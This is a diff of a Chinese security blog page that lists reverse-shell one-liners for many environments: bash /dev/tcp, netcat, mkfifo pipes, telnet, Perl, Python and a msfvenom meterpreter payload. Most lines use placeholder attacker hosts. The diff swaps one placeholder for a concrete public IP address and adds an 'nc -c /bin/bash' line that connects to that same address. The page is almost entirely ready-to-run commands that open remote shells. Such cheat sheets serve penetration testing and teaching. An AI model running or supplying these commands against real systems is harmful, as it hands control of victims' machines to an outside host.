@@ -706,7 +706,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        10 分
                     </div>
                     
                 
@@ -774,13 +774,16 @@
 <p>这就是反弹shell的基本原理</p>
 <p>下面收录一些特殊的反弹shell方式</p>
 <h3 id="各种环境下反弹shell的方法"><a href="#各种环境下反弹shell的方法" class="headerlink" title="各种环境下反弹shell的方法"></a>各种环境下反弹shell的方法</h3><p>​     </p>
-<h4 id="0x01-bash版本："><a href="#0x01-bash版本：" class="headerlink" title="0x01 bash版本："></a>0x01 bash版本：</h4><pre><code>bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持。我用zsh不能反弹。这个也是最常用的。</p>
+<h4 id="0x01-bash版本："><a href="#0x01-bash版本：" class="headerlink" title="0x01 bash版本："></a>0x01 bash版本：</h4><pre><code>bash -i &gt;&amp; /dev/tcp/121.4.101.246/6666 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持。我用zsh不能反弹。这个也是最常用的。</p>
 <h4 id="0x02-nc版本："><a href="#0x02-nc版本：" class="headerlink" title="0x02 nc版本："></a>0x02 nc版本：</h4><p>支持-e选项</p>
-<pre><code>nc -e /bin/sh attackerip 1234</code></pre><p>这个方式最简单<br>不能使用-e选项时：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -e '/bin/sh' attackip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这个方式最简单<br>不能使用-e选项时：</p>
 <pre><code>mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe
 /bin/sh | nc attackerip 4444
 rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</code></pre><p>安装的NC版本有问题时：</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</code></pre><h4 id="0x03-Telnet版本：-nc不可用或-dev-tcp不可用时"><a href="#0x03-Telnet版本：-nc不可用或-dev-tcp不可用时" class="headerlink" title="0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)"></a>0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)</h4><pre><code>mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h4 id="0x04-Perl版本："><a href="#0x04-Perl版本：" class="headerlink" title="0x04 Perl版本："></a>0x04 Perl版本：</h4><pre><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>不依赖于/bin/sh的shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</code></pre><p>又发现一种，添加进来</p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -c '/bin/bash' 121.4.101.246 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="0x03-Telnet版本：-nc不可用或-dev-tcp不可用时"><a href="#0x03-Telnet版本：-nc不可用或-dev-tcp不可用时" class="headerlink" title="0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)"></a>0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)</h4><pre><code>mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h4 id="0x04-Perl版本："><a href="#0x04-Perl版本：" class="headerlink" title="0x04 Perl版本："></a>0x04 Perl版本：</h4><pre><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>不依赖于/bin/sh的shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p>
 <pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></pre><h4 id="0x05-Python版本："><a href="#0x05-Python版本：" class="headerlink" title="0x05 Python版本："></a>0x05 Python版本：</h4><pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre><p>另外的形式：</p>
 <pre><code>python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</code></pre><p>另外Metasploit版的代码：</p>
 <pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234
@@ -1138,7 +1141,7 @@ p.waitFor()</code></pre><h4 id="0x08-ruby版本："><a href="#0x08-ruby版本：
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">85.8k</span> 字
+                <span class="white-color">89.5k</span> 字
             
 
             
